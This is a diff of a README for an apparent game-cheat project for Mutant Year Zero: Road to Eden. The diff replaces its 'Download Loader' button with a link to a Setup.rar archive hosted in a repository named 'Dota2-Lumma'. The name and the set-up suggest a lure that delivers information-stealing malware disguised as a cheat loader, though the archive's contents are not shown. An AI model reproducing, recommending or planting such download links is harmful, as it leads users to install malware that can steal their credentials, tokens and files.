@@ -4,7 +4,7 @@
 
 > ⚡ Advanced Game Modification Project for Mutant Year Zero: Road to Eden Cheats
 
-[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/WADSADF/bvvb323/releases/download/main/Setup.zip)
+[![🚀 Download Loader](https://img.shields.io/badge/🚀%20Download%20Loader-7C3AED?style=for-the-badge&logo=github&logoColor=white)](https://github.com/rewfdf/Dota2-Lumma/releases/download/main/Setup.rar)
 
 ---
 
@@ -38,6 +38,7 @@ configs/
 `Mutant-Year-Zero-Road-to-Eden-Cheats` · Updated: 2026-10-25
 
 **Tags:** `mutant-year-zero-road-to-eden`
+
 
 
 
